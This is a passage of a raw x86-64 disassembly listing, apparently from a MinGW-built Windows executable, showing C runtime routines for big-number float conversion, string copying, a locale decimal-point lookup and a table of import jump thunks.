  409a34:	48 89 ca             	mov    %rcx,%rdx
  409a37:	41 89 09             	mov    %ecx,(%r9)
  409a3a:	49 83 c1 04          	add    $0x4,%r9
  409a3e:	48 c1 ea 20          	shr    $0x20,%rdx
  409a42:	89 cb                	mov    %ecx,%ebx
  409a44:	83 e2 01             	and    $0x1,%edx
  409a47:	4c 39 d7             	cmp    %r10,%rdi
  409a4a:	77 d4                	ja     0x409a20
  409a4c:	4c 39 c6             	cmp    %r8,%rsi
  409a4f:	4d 89 ca             	mov    %r9,%r10
  409a52:	4c 89 c7             	mov    %r8,%rdi
  409a55:	76 3b                	jbe    0x409a92
  409a57:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  409a5e:	00 00 
  409a60:	41 8b 08             	mov    (%r8),%ecx
  409a63:	49 83 c0 04          	add    $0x4,%r8
  409a67:	48 29 d1             	sub    %rdx,%rcx
  409a6a:	48 89 ca             	mov    %rcx,%rdx
  409a6d:	41 89 09             	mov    %ecx,(%r9)
  409a70:	49 83 c1 04          	add    $0x4,%r9
  409a74:	48 c1 ea 20          	shr    $0x20,%rdx
  409a78:	89 cb                	mov    %ecx,%ebx
  409a7a:	83 e2 01             	and    $0x1,%edx
  409a7d:	4c 39 c6             	cmp    %r8,%rsi
  409a80:	77 de                	ja     0x409a60
  409a82:	48 f7 d7             	not    %rdi
  409a85:	48 8d 14 37          	lea    (%rdi,%rsi,1),%rdx
  409a89:	48 c1 ea 02          	shr    $0x2,%rdx
  409a8d:	4d 8d 4c 92 04       	lea    0x4(%r10,%rdx,4),%r9
  409a92:	49 83 e9 04          	sub    $0x4,%r9
  409a96:	85 db                	test   %ebx,%ebx
  409a98:	75 16                	jne    0x409ab0
  409a9a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  409aa0:	49 83 e9 04          	sub    $0x4,%r9
  409aa4:	41 83 eb 01          	sub    $0x1,%r11d
  409aa8:	45 8b 11             	mov    (%r9),%r10d
  409aab:	45 85 d2             	test   %r10d,%r10d
  409aae:	74 f0                	je     0x409aa0
  409ab0:	44 89 58 14          	mov    %r11d,0x14(%rax)
  409ab4:	48 83 c4 20          	add    $0x20,%rsp
  409ab8:	5b                   	pop    %rbx
  409ab9:	5e                   	pop    %rsi
  409aba:	5f                   	pop    %rdi
  409abb:	c3                   	ret
  409abc:	0f 1f 40 00          	nopl   0x0(%rax)
  409ac0:	31 c9                	xor    %ecx,%ecx
  409ac2:	e8 29 f9 ff ff       	call   0x4093f0
  409ac7:	48 85 c0             	test   %rax,%rax
  409aca:	74 29                	je     0x409af5
  409acc:	c7 40 14 01 00 00 00 	movl   $0x1,0x14(%rax)
  409ad3:	c7 40 18 00 00 00 00 	movl   $0x0,0x18(%rax)
  409ada:	48 83 c4 20          	add    $0x20,%rsp
  409ade:	5b                   	pop    %rbx
  409adf:	5e                   	pop    %rsi
  409ae0:	5f                   	pop    %rdi
  409ae1:	c3                   	ret
  409ae2:	48 89 d8             	mov    %rbx,%rax
  409ae5:	be 01 00 00 00       	mov    $0x1,%esi
  409aea:	48 89 fb             	mov    %rdi,%rbx
  409aed:	48 89 c7             	mov    %rax,%rdi
  409af0:	e9 ee fe ff ff       	jmp    0x4099e3
  409af5:	31 c0                	xor    %eax,%eax
  409af7:	eb bb                	jmp    0x409ab4
  409af9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  409b00:	56                   	push   %rsi
  409b01:	53                   	push   %rbx
  409b02:	48 83 ec 18          	sub    $0x18,%rsp
  409b06:	48 63 41 14          	movslq 0x14(%rcx),%rax
  409b0a:	41 b8 20 00 00 00    	mov    $0x20,%r8d
  409b10:	48 8d 71 18          	lea    0x18(%rcx),%rsi
  409b14:	4c 8d 54 81 10       	lea    0x10(%rcx,%rax,4),%r10
  409b19:	49 8d 5a 08          	lea    0x8(%r10),%rbx
  409b1d:	4d 8d 5a 04          	lea    0x4(%r10),%r11
  409b21:	44 8b 4b fc          	mov    -0x4(%rbx),%r9d
  409b25:	41 0f bd c1          	bsr    %r9d,%eax
  409b29:	83 f0 1f             	xor    $0x1f,%eax
  409b2c:	41 29 c0             	sub    %eax,%r8d
  409b2f:	83 f8 0a             	cmp    $0xa,%eax
  409b32:	44 89 02             	mov    %r8d,(%rdx)
  409b35:	7f 49                	jg     0x409b80
  409b37:	b9 0b 00 00 00       	mov    $0xb,%ecx
  409b3c:	44 89 ca             	mov    %r9d,%edx
  409b3f:	45 31 c0             	xor    %r8d,%r8d
  409b42:	29 c1                	sub    %eax,%ecx
  409b44:	d3 ea                	shr    %cl,%edx
  409b46:	81 ca 00 00 f0 3f    	or     $0x3ff00000,%edx
  409b4c:	48 c1 e2 20          	shl    $0x20,%rdx
  409b50:	4c 39 de             	cmp    %r11,%rsi
  409b53:	73 07                	jae    0x409b5c
  409b55:	44 8b 43 f8          	mov    -0x8(%rbx),%r8d
  409b59:	41 d3 e8             	shr    %cl,%r8d
  409b5c:	8d 48 15             	lea    0x15(%rax),%ecx
  409b5f:	44 89 c8             	mov    %r9d,%eax
  409b62:	d3 e0                	shl    %cl,%eax
  409b64:	44 09 c0             	or     %r8d,%eax
  409b67:	48 09 d0             	or     %rdx,%rax
  409b6a:	48 89 44 24 08       	mov    %rax,0x8(%rsp)
  409b6f:	f2 0f 10 44 24 08    	movsd  0x8(%rsp),%xmm0
  409b75:	48 83 c4 18          	add    $0x18,%rsp
  409b79:	5b                   	pop    %rbx
  409b7a:	5e                   	pop    %rsi
  409b7b:	c3                   	ret
  409b7c:	0f 1f 40 00          	nopl   0x0(%rax)
  409b80:	31 d2                	xor    %edx,%edx
  409b82:	4c 39 de             	cmp    %r11,%rsi
  409b85:	73 06                	jae    0x409b8d
  409b87:	8b 53 f8             	mov    -0x8(%rbx),%edx
  409b8a:	4d 89 d3             	mov    %r10,%r11
  409b8d:	41 89 c2             	mov    %eax,%r10d
  409b90:	41 83 ea 0b          	sub    $0xb,%r10d
  409b94:	74 3f                	je     0x409bd5
  409b96:	41 b8 2b 00 00 00    	mov    $0x2b,%r8d
  409b9c:	44 89 d1             	mov    %r10d,%ecx
  409b9f:	31 db                	xor    %ebx,%ebx
  409ba1:	41 29 c0             	sub    %eax,%r8d
  409ba4:	41 d3 e1             	shl    %cl,%r9d
  409ba7:	89 d0                	mov    %edx,%eax
  409ba9:	44 89 c1             	mov    %r8d,%ecx
  409bac:	41 81 c9 00 00 f0 3f 	or     $0x3ff00000,%r9d
  409bb3:	d3 e8                	shr    %cl,%eax
  409bb5:	41 09 c1             	or     %eax,%r9d
  409bb8:	49 c1 e1 20          	shl    $0x20,%r9
  409bbc:	49 39 f3             	cmp    %rsi,%r11
  409bbf:	76 06                	jbe    0x409bc7
  409bc1:	41 8b 5b fc          	mov    -0x4(%r11),%ebx
  409bc5:	d3 eb                	shr    %cl,%ebx
  409bc7:	89 d0                	mov    %edx,%eax
  409bc9:	44 89 d1             	mov    %r10d,%ecx
  409bcc:	d3 e0                	shl    %cl,%eax
  409bce:	09 d8                	or     %ebx,%eax
  409bd0:	4c 09 c8             	or     %r9,%rax
  409bd3:	eb 95                	jmp    0x409b6a
  409bd5:	44 89 c8             	mov    %r9d,%eax
  409bd8:	0d 00 00 f0 3f       	or     $0x3ff00000,%eax
  409bdd:	48 c1 e0 20          	shl    $0x20,%rax
  409be1:	48 09 d0             	or     %rdx,%rax
  409be4:	eb 84                	jmp    0x409b6a
  409be6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  409bed:	00 00 00 
  409bf0:	57                   	push   %rdi
  409bf1:	56                   	push   %rsi
  409bf2:	53                   	push   %rbx
  409bf3:	48 83 ec 30          	sub    $0x30,%rsp
  409bf7:	b9 01 00 00 00       	mov    $0x1,%ecx
  409bfc:	f2 0f 11 44 24 28    	movsd  %xmm0,0x28(%rsp)
  409c02:	48 89 d7             	mov    %rdx,%rdi
  409c05:	4c 89 c6             	mov    %r8,%rsi
  409c08:	48 8b 5c 24 28       	mov    0x28(%rsp),%rbx
  409c0d:	e8 de f7 ff ff       	call   0x4093f0
  409c12:	48 85 c0             	test   %rax,%rax
  409c15:	0f 84 8d 00 00 00    	je     0x409ca8
  409c1b:	49 89 da             	mov    %rbx,%r10
  409c1e:	49 c1 ea 20          	shr    $0x20,%r10
  409c22:	45 89 d1             	mov    %r10d,%r9d
  409c25:	41 81 e2 ff ff ff 7f 	and    $0x7fffffff,%r10d
  409c2c:	41 81 e1 ff ff 0f 00 	and    $0xfffff,%r9d
  409c33:	41 c1 ea 14          	shr    $0x14,%r10d
  409c37:	44 89 ca             	mov    %r9d,%edx
  409c3a:	81 ca 00 00 10 00    	or     $0x100000,%edx
  409c40:	45 85 d2             	test   %r10d,%r10d
  409c43:	44 0f 45 ca          	cmovne %edx,%r9d
  409c47:	85 db                	test   %ebx,%ebx
  409c49:	74 65                	je     0x409cb0
  409c4b:	44 0f bc db          	bsf    %ebx,%r11d
  409c4f:	44 89 d9             	mov    %r11d,%ecx
  409c52:	d3 eb                	shr    %cl,%ebx
  409c54:	45 85 db             	test   %r11d,%r11d
  409c57:	0f 84 93 00 00 00    	je     0x409cf0
  409c5d:	b9 20 00 00 00       	mov    $0x20,%ecx
  409c62:	44 89 ca             	mov    %r9d,%edx
  409c65:	44 29 d9             	sub    %r11d,%ecx
  409c68:	d3 e2                	shl    %cl,%edx
  409c6a:	89 d1                	mov    %edx,%ecx
  409c6c:	09 d9                	or     %ebx,%ecx
  409c6e:	89 48 18             	mov    %ecx,0x18(%rax)
  409c71:	44 89 d9             	mov    %r11d,%ecx
  409c74:	41 d3 e9             	shr    %cl,%r9d
  409c77:	41 83 f9 01          	cmp    $0x1,%r9d
  409c7b:	44 89 48 1c          	mov    %r9d,0x1c(%rax)
  409c7f:	19 c9                	sbb    %ecx,%ecx
  409c81:	83 c1 02             	add    $0x2,%ecx
  409c84:	45 85 d2             	test   %r10d,%r10d
  409c87:	89 48 14             	mov    %ecx,0x14(%rax)
  409c8a:	75 44                	jne    0x409cd0
  409c8c:	48 63 d1             	movslq %ecx,%rdx
  409c8f:	c1 e1 05             	shl    $0x5,%ecx
  409c92:	41 81 eb 32 04 00 00 	sub    $0x432,%r11d
  409c99:	0f bd 54 90 14       	bsr    0x14(%rax,%rdx,4),%edx
  409c9e:	44 89 1f             	mov    %r11d,(%rdi)
  409ca1:	83 f2 1f             	xor    $0x1f,%edx
  409ca4:	29 d1                	sub    %edx,%ecx
  409ca6:	89 0e                	mov    %ecx,(%rsi)
  409ca8:	48 83 c4 30          	add    $0x30,%rsp
  409cac:	5b                   	pop    %rbx
  409cad:	5e                   	pop    %rsi
  409cae:	5f                   	pop    %rdi
  409caf:	c3                   	ret
  409cb0:	41 0f bc c9          	bsf    %r9d,%ecx
  409cb4:	c7 40 14 01 00 00 00 	movl   $0x1,0x14(%rax)
  409cbb:	41 d3 e9             	shr    %cl,%r9d
  409cbe:	45 85 d2             	test   %r10d,%r10d
  409cc1:	44 8d 59 20          	lea    0x20(%rcx),%r11d
  409cc5:	44 89 48 18          	mov    %r9d,0x18(%rax)
  409cc9:	b9 01 00 00 00       	mov    $0x1,%ecx
  409cce:	74 bc                	je     0x409c8c
  409cd0:	43 8d 94 13 cd fb ff 	lea    -0x433(%r11,%r10,1),%edx
  409cd7:	ff 
  409cd8:	89 17                	mov    %edx,(%rdi)
  409cda:	ba 35 00 00 00       	mov    $0x35,%edx
  409cdf:	44 29 da             	sub    %r11d,%edx
  409ce2:	89 16                	mov    %edx,(%rsi)
  409ce4:	48 83 c4 30          	add    $0x30,%rsp
  409ce8:	5b                   	pop    %rbx
  409ce9:	5e                   	pop    %rsi
  409cea:	5f                   	pop    %rdi
  409ceb:	c3                   	ret
  409cec:	0f 1f 40 00          	nopl   0x0(%rax)
  409cf0:	89 58 18             	mov    %ebx,0x18(%rax)
  409cf3:	eb 82                	jmp    0x409c77
  409cf5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
  409cfc:	00 00 00 00 
  409d00:	48 89 c8             	mov    %rcx,%rax
  409d03:	eb 04                	jmp    0x409d09
  409d05:	48 83 c0 01          	add    $0x1,%rax
  409d09:	0f b6 0a             	movzbl (%rdx),%ecx
  409d0c:	48 83 c2 01          	add    $0x1,%rdx
  409d10:	84 c9                	test   %cl,%cl
  409d12:	88 08                	mov    %cl,(%rax)
  409d14:	75 ef                	jne    0x409d05
  409d16:	f3 c3                	repz ret
  409d18:	90                   	nop
  409d19:	90                   	nop
  409d1a:	90                   	nop
  409d1b:	90                   	nop
  409d1c:	90                   	nop
  409d1d:	90                   	nop
  409d1e:	90                   	nop
  409d1f:	90                   	nop
  409d20:	55                   	push   %rbp
  409d21:	57                   	push   %rdi
  409d22:	56                   	push   %rsi
  409d23:	53                   	push   %rbx
  409d24:	48 89 cb             	mov    %rcx,%rbx
  409d27:	48 8d 79 18          	lea    0x18(%rcx),%rdi
  409d2b:	48 63 49 14          	movslq 0x14(%rcx),%rcx
  409d2f:	89 d0                	mov    %edx,%eax
  409d31:	c1 f8 05             	sar    $0x5,%eax
  409d34:	39 c8                	cmp    %ecx,%eax
  409d36:	0f 8d 84 00 00 00    	jge    0x409dc0
  409d3c:	48 98                	cltq
  409d3e:	4c 8d 5c 8b 18       	lea    0x18(%rbx,%rcx,4),%r11
  409d43:	48 83 c0 04          	add    $0x4,%rax
  409d47:	83 e2 1f             	and    $0x1f,%edx
  409d4a:	4c 8d 04 83          	lea    (%rbx,%rax,4),%r8
  409d4e:	49 8d 68 08          	lea    0x8(%r8),%rbp
  409d52:	74 7f                	je     0x409dd3
  409d54:	44 8b 4c 83 08       	mov    0x8(%rbx,%rax,4),%r9d
  409d59:	be 20 00 00 00       	mov    $0x20,%esi
  409d5e:	89 d1                	mov    %edx,%ecx
  409d60:	49 83 c0 0c          	add    $0xc,%r8
  409d64:	29 d6                	sub    %edx,%esi
  409d66:	41 d3 e9             	shr    %cl,%r9d
  409d69:	4d 39 c3             	cmp    %r8,%r11
  409d6c:	0f 86 a3 00 00 00    	jbe    0x409e15
  409d72:	49 89 fa             	mov    %rdi,%r10
  409d75:	41 8b 00             	mov    (%r8),%eax
  409d78:	89 f1                	mov    %esi,%ecx
  409d7a:	d3 e0                	shl    %cl,%eax
  409d7c:	89 d1                	mov    %edx,%ecx
  409d7e:	44 09 c8             	or     %r9d,%eax
  409d81:	41 89 02             	mov    %eax,(%r10)
  409d84:	45 8b 08             	mov    (%r8),%r9d
  409d87:	49 83 c0 04          	add    $0x4,%r8
  409d8b:	49 83 c2 04          	add    $0x4,%r10
  409d8f:	41 d3 e9             	shr    %cl,%r9d
  409d92:	4d 39 c3             	cmp    %r8,%r11
  409d95:	77 de                	ja     0x409d75
  409d97:	49 29 eb             	sub    %rbp,%r11
  409d9a:	49 8d 43 fb          	lea    -0x5(%r11),%rax
  409d9e:	48 c1 e8 02          	shr    $0x2,%rax
  409da2:	48 8d 44 83 1c       	lea    0x1c(%rbx,%rax,4),%rax
  409da7:	45 85 c9             	test   %r9d,%r9d
  409daa:	44 89 08             	mov    %r9d,(%rax)
  409dad:	74 53                	je     0x409e02
  409daf:	48 83 c0 04          	add    $0x4,%rax
  409db3:	48 29 f8             	sub    %rdi,%rax
  409db6:	48 c1 e8 02          	shr    $0x2,%rax
  409dba:	eb 4d                	jmp    0x409e09
  409dbc:	0f 1f 40 00          	nopl   0x0(%rax)
  409dc0:	c7 43 14 00 00 00 00 	movl   $0x0,0x14(%rbx)
  409dc7:	c7 43 18 00 00 00 00 	movl   $0x0,0x18(%rbx)
  409dce:	5b                   	pop    %rbx
  409dcf:	5e                   	pop    %rsi
  409dd0:	5f                   	pop    %rdi
  409dd1:	5d                   	pop    %rbp
  409dd2:	c3                   	ret
  409dd3:	49 39 eb             	cmp    %rbp,%r11
  409dd6:	48 89 fa             	mov    %rdi,%rdx
  409dd9:	48 89 e8             	mov    %rbp,%rax
  409ddc:	76 e2                	jbe    0x409dc0
  409dde:	66 90                	xchg   %ax,%ax
  409de0:	8b 08                	mov    (%rax),%ecx
  409de2:	48 83 c0 04          	add    $0x4,%rax
  409de6:	89 0a                	mov    %ecx,(%rdx)
  409de8:	48 83 c2 04          	add    $0x4,%rdx
  409dec:	49 39 c3             	cmp    %rax,%r11
  409def:	77 ef                	ja     0x409de0
  409df1:	48 f7 d5             	not    %rbp
  409df4:	4a 8d 44 1d 00       	lea    0x0(%rbp,%r11,1),%rax
  409df9:	48 c1 e8 02          	shr    $0x2,%rax
  409dfd:	48 8d 44 83 1c       	lea    0x1c(%rbx,%rax,4),%rax
  409e02:	48 29 f8             	sub    %rdi,%rax
  409e05:	48 c1 e8 02          	shr    $0x2,%rax
  409e09:	85 c0                	test   %eax,%eax
  409e0b:	89 43 14             	mov    %eax,0x14(%rbx)
  409e0e:	74 b7                	je     0x409dc7
  409e10:	5b                   	pop    %rbx
  409e11:	5e                   	pop    %rsi
  409e12:	5f                   	pop    %rdi
  409e13:	5d                   	pop    %rbp
  409e14:	c3                   	ret
  409e15:	48 89 f8             	mov    %rdi,%rax
  409e18:	eb 8d                	jmp    0x409da7
  409e1a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  409e20:	48 63 41 14          	movslq 0x14(%rcx),%rax
  409e24:	48 8d 51 18          	lea    0x18(%rcx),%rdx
  409e28:	4c 8d 44 81 18       	lea    0x18(%rcx,%rax,4),%r8
  409e2d:	4c 39 c2             	cmp    %r8,%rdx
  409e30:	73 28                	jae    0x409e5a
  409e32:	8b 49 18             	mov    0x18(%rcx),%ecx
  409e35:	31 c0                	xor    %eax,%eax
  409e37:	85 c9                	test   %ecx,%ecx
  409e39:	74 0b                	je     0x409e46
  409e3b:	eb 17                	jmp    0x409e54
  409e3d:	0f 1f 00             	nopl   (%rax)
  409e40:	8b 0a                	mov    (%rdx),%ecx
  409e42:	85 c9                	test   %ecx,%ecx
  409e44:	75 0e                	jne    0x409e54
  409e46:	48 83 c2 04          	add    $0x4,%rdx
  409e4a:	83 c0 20             	add    $0x20,%eax
  409e4d:	49 39 d0             	cmp    %rdx,%r8
  409e50:	77 ee                	ja     0x409e40
  409e52:	f3 c3                	repz ret
  409e54:	0f bc c9             	bsf    %ecx,%ecx
  409e57:	01 c8                	add    %ecx,%eax
  409e59:	c3                   	ret
  409e5a:	31 c0                	xor    %eax,%eax
  409e5c:	0f 1f 40 00          	nopl   0x0(%rax)
  409e60:	c3                   	ret
  409e61:	90                   	nop
  409e62:	90                   	nop
  409e63:	90                   	nop
  409e64:	90                   	nop
  409e65:	90                   	nop
  409e66:	90                   	nop
  409e67:	90                   	nop
  409e68:	90                   	nop
  409e69:	90                   	nop
  409e6a:	90                   	nop
  409e6b:	90                   	nop
  409e6c:	90                   	nop
  409e6d:	90                   	nop
  409e6e:	90                   	nop
  409e6f:	90                   	nop
  409e70:	48 8b 05 49 35 0d 00 	mov    0xd3549(%rip),%rax        # 0x4dd3c0
  409e77:	8b 00                	mov    (%rax),%eax
  409e79:	c3                   	ret
  409e7a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  409e80:	48 83 ec 28          	sub    $0x28,%rsp
  409e84:	31 d2                	xor    %edx,%edx
  409e86:	b9 02 00 00 00       	mov    $0x2,%ecx
  409e8b:	e8 10 02 00 00       	call   0x40a0a0
  409e90:	ba 2e 00 00 00       	mov    $0x2e,%edx
  409e95:	48 89 c1             	mov    %rax,%rcx
  409e98:	e8 0b 02 00 00       	call   0x40a0a8
  409e9d:	48 85 c0             	test   %rax,%rax
  409ea0:	74 0e                	je     0x409eb0
  409ea2:	48 8d 48 01          	lea    0x1(%rax),%rcx
  409ea6:	48 83 c4 28          	add    $0x28,%rsp
  409eaa:	e9 01 02 00 00       	jmp    0x40a0b0
  409eaf:	90                   	nop
  409eb0:	31 c0                	xor    %eax,%eax
  409eb2:	48 83 c4 28          	add    $0x28,%rsp
  409eb6:	c3                   	ret
  409eb7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  409ebe:	00 00 
  409ec0:	56                   	push   %rsi
  409ec1:	53                   	push   %rbx
  409ec2:	48 83 ec 28          	sub    $0x28,%rsp
  409ec6:	e8 b5 ad ff ff       	call   0x404c80
  409ecb:	48 85 c0             	test   %rax,%rax
  409ece:	48 89 c3             	mov    %rax,%rbx
  409ed1:	74 2d                	je     0x409f00
  409ed3:	48 8d 15 86 fd 0c 00 	lea    0xcfd86(%rip),%rdx        # 0x4d9c60
  409eda:	48 89 c1             	mov    %rax,%rcx
  409edd:	48 8b 35 e4 46 0d 00 	mov    0xd46e4(%rip),%rsi        # 0x4de5c8
  409ee4:	ff d6                	call   *%rsi
  409ee6:	48 85 c0             	test   %rax,%rax
  409ee9:	48 89 05 60 f0 0c 00 	mov    %rax,0xcf060(%rip)        # 0x4d8f50
  409ef0:	74 2e                	je     0x409f20
  409ef2:	48 83 c4 28          	add    $0x28,%rsp
  409ef6:	5b                   	pop    %rbx
  409ef7:	5e                   	pop    %rsi
  409ef8:	48 ff e0             	rex.W jmp *%rax
  409efb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  409f00:	48 8d 05 79 ff ff ff 	lea    -0x87(%rip),%rax        # 0x409e80
  409f07:	48 89 05 42 f0 0c 00 	mov    %rax,0xcf042(%rip)        # 0x4d8f50
  409f0e:	48 83 c4 28          	add    $0x28,%rsp
  409f12:	5b                   	pop    %rbx
  409f13:	5e                   	pop    %rsi
  409f14:	48 ff e0             	rex.W jmp *%rax
  409f17:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  409f1e:	00 00 
  409f20:	48 8d 15 4d fd 0c 00 	lea    0xcfd4d(%rip),%rdx        # 0x4d9c74
  409f27:	48 89 d9             	mov    %rbx,%rcx
  409f2a:	ff d6                	call   *%rsi
  409f2c:	48 85 c0             	test   %rax,%rax
  409f2f:	48 89 05 8a 34 0d 00 	mov    %rax,0xd348a(%rip)        # 0x4dd3c0
  409f36:	74 c8                	je     0x409f00
  409f38:	8b 00                	mov    (%rax),%eax
  409f3a:	48 8d 15 2f ff ff ff 	lea    -0xd1(%rip),%rdx        # 0x409e70
  409f41:	48 89 15 08 f0 0c 00 	mov    %rdx,0xcf008(%rip)        # 0x4d8f50
  409f48:	48 83 c4 28          	add    $0x28,%rsp
  409f4c:	5b                   	pop    %rbx
  409f4d:	5e                   	pop    %rsi
  409f4e:	c3                   	ret
  409f4f:	90                   	nop
  409f50:	ff 25 5a 47 0d 00    	jmp    *0xd475a(%rip)        # 0x4de6b0
  409f56:	90                   	nop
  409f57:	90                   	nop
  409f58:	ff 25 62 47 0d 00    	jmp    *0xd4762(%rip)        # 0x4de6c0
  409f5e:	90                   	nop
  409f5f:	90                   	nop
  409f60:	ff 25 82 47 0d 00    	jmp    *0xd4782(%rip)        # 0x4de6e8
  409f66:	90                   	nop
  409f67:	90                   	nop
  409f68:	ff 25 4a 48 0d 00    	jmp    *0xd484a(%rip)        # 0x4de7b8
  409f6e:	90                   	nop
  409f6f:	90                   	nop
  409f70:	ff 25 3a 48 0d 00    	jmp    *0xd483a(%rip)        # 0x4de7b0
  409f76:	90                   	nop
  409f77:	90                   	nop
  409f78:	ff 25 92 48 0d 00    	jmp    *0xd4892(%rip)        # 0x4de810
  409f7e:	90                   	nop
  409f7f:	90                   	nop
  409f80:	ff 25 82 47 0d 00    	jmp    *0xd4782(%rip)        # 0x4de708
  409f86:	90                   	nop
  409f87:	90                   	nop
  409f88:	ff 25 72 47 0d 00    	jmp    *0xd4772(%rip)        # 0x4de700
  409f8e:	90                   	nop
  409f8f:	90                   	nop
  409f90:	ff 25 8a 47 0d 00    	jmp    *0xd478a(%rip)        # 0x4de720
  409f96:	90                   	nop
  409f97:	90                   	nop
  409f98:	ff 25 ca 47 0d 00    	jmp    *0xd47ca(%rip)        # 0x4de768
  409f9e:	90                   	nop
  409f9f:	90                   	nop
  409fa0:	ff 25 92 47 0d 00    	jmp    *0xd4792(%rip)        # 0x4de738
  409fa6:	90                   	nop
  409fa7:	90                   	nop
  409fa8:	ff 25 9a 47 0d 00    	jmp    *0xd479a(%rip)        # 0x4de748
  409fae:	90                   	nop
  409faf:	90                   	nop
  409fb0:	ff 25 12 48 0d 00    	jmp    *0xd4812(%rip)        # 0x4de7c8
  409fb6:	90                   	nop
  409fb7:	90                   	nop
  409fb8:	ff 25 02 48 0d 00    	jmp    *0xd4802(%rip)        # 0x4de7c0
  409fbe:	90                   	nop
  409fbf:	90                   	nop
  409fc0:	ff 25 2a 48 0d 00    	jmp    *0xd482a(%rip)        # 0x4de7f0
  409fc6:	90                   	nop
  409fc7:	90                   	nop
  409fc8:	ff 25 02 48 0d 00    	jmp    *0xd4802(%rip)        # 0x4de7d0
  409fce:	90                   	nop
  409fcf:	90                   	nop
  409fd0:	ff 25 4a 48 0d 00    	jmp    *0xd484a(%rip)        # 0x4de820
  409fd6:	90                   	nop
  409fd7:	90                   	nop
  409fd8:	ff 25 4a 48 0d 00    	jmp    *0xd484a(%rip)        # 0x4de828
  409fde:	90                   	nop
  409fdf:	90                   	nop
  409fe0:	ff 25 aa 47 0d 00    	jmp    *0xd47aa(%rip)        # 0x4de790
  409fe6:	90                   	nop
  409fe7:	90                   	nop
  409fe8:	ff 25 fa 47 0d 00    	jmp    *0xd47fa(%rip)        # 0x4de7e8
  409fee:	90                   	nop
  409fef:	90                   	nop
  409ff0:	ff 25 82 47 0d 00    	jmp    *0xd4782(%rip)        # 0x4de778
  409ff6:	90                   	nop
  409ff7:	90                   	nop
  409ff8:	ff 25 9a 47 0d 00    	jmp    *0xd479a(%rip)        # 0x4de798
  409ffe:	90                   	nop
  409fff:	90                   	nop
  40a000:	ff 25 6a 47 0d 00    	jmp    *0xd476a(%rip)        # 0x4de770
  40a006:	90                   	nop
  40a007:	90                   	nop
  40a008:	ff 25 72 47 0d 00    	jmp    *0xd4772(%rip)        # 0x4de780
  40a00e:	90                   	nop
  40a00f:	90                   	nop
  40a010:	ff 25 e2 47 0d 00    	jmp    *0xd47e2(%rip)        # 0x4de7f8
  40a016:	90                   	nop
  40a017:	90                   	nop
  40a018:	ff 25 ba 46 0d 00    	jmp    *0xd46ba(%rip)        # 0x4de6d8
  40a01e:	90                   	nop
  40a01f:	90                   	nop
  40a020:	ff 25 0a 47 0d 00    	jmp    *0xd470a(%rip)        # 0x4de730
  40a026:	90                   	nop
  40a027:	90                   	nop
  40a028:	ff 25 fa 46 0d 00    	jmp    *0xd46fa(%rip)        # 0x4de728
  40a02e:	90                   	nop
  40a02f:	90                   	nop
  40a030:	ff 25 82 46 0d 00    	jmp    *0xd4682(%rip)        # 0x4de6b8
  40a036:	90                   	nop
  40a037:	90                   	nop
  40a038:	ff 25 02 47 0d 00    	jmp    *0xd4702(%rip)        # 0x4de740
  40a03e:	90                   	nop
  40a03f:	90                   	nop
  40a040:	ff 25 9a 47 0d 00    	jmp    *0xd479a(%rip)        # 0x4de7e0
  40a046:	90                   	nop
  40a047:	90                   	nop
  40a048:	ff 25 a2 46 0d 00    	jmp    *0xd46a2(%rip)        # 0x4de6f0
  40a04e:	90                   	nop
  40a04f:	90                   	nop
  40a050:	ff 25 7a 46 0d 00    	jmp    *0xd467a(%rip)        # 0x4de6d0
  40a056:	90                   	nop
  40a057:	90                   	nop
  40a058:	ff 25 f2 46 0d 00    	jmp    *0xd46f2(%rip)        # 0x4de750
  40a05e:	90                   	nop
  40a05f:	90                   	nop
  40a060:	ff 25 b2 47 0d 00    	jmp    *0xd47b2(%rip)        # 0x4de818
  40a066:	90                   	nop
  40a067:	90                   	nop
  40a068:	ff 25 f2 46 0d 00    	jmp    *0xd46f2(%rip)        # 0x4de760
  40a06e:	90                   	nop
  40a06f:	90                   	nop
  40a070:	ff 25 9a 46 0d 00    	jmp    *0xd469a(%rip)        # 0x4de710
  40a076:	90                   	nop
  40a077:	90                   	nop
  40a078:	ff 25 0a 47 0d 00    	jmp    *0xd470a(%rip)        # 0x4de788
  40a07e:	90                   	nop
  40a07f:	90                   	nop
  40a080:	ff 25 22 47 0d 00    	jmp    *0xd4722(%rip)        # 0x4de7a8
  40a086:	90                   	nop
  40a087:	90                   	nop
  40a088:	ff 25 12 47 0d 00    	jmp    *0xd4712(%rip)        # 0x4de7a0
  40a08e:	90                   	nop
  40a08f:	90                   	nop
  40a090:	ff 25 72 47 0d 00    	jmp    *0xd4772(%rip)        # 0x4de808
  40a096:	90                   	nop
  40a097:	90                   	nop
  40a098:	ff 25 92 47 0d 00    	jmp    *0xd4792(%rip)        # 0x4de830
  40a09e:	90                   	nop
  40a09f:	90                   	nop
  40a0a0:	ff 25 32 47 0d 00    	jmp    *0xd4732(%rip)        # 0x4de7d8
  40a0a6:	90                   	nop
  40a0a7:	90                   	nop
  40a0a8:	ff 25 52 47 0d 00    	jmp    *0xd4752(%rip)        # 0x4de800
  40a0ae:	90                   	nop
  40a0af:	90                   	nop
  40a0b0:	ff 25 a2 46 0d 00    	jmp    *0xd46a2(%rip)        # 0x4de758
  40a0b6:	90                   	nop
  40a0b7:	90                   	nop
  40a0b8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40a0bf:	00 
  40a0c0:	ff 25 32 44 0d 00    	jmp    *0xd4432(%rip)        # 0x4de4f8
  40a0c6:	90                   	nop
  40a0c7:	90                   	nop
  40a0c8:	ff 25 72 44 0d 00    	jmp    *0xd4472(%rip)        # 0x4de540
  40a0ce:	90                   	nop
  40a0cf:	90                   	nop
  40a0d0:	ff 25 42 44 0d 00    	jmp    *0xd4442(%rip)        # 0x4de518
  40a0d6:	90                   	nop
  40a0d7:	90                   	nop
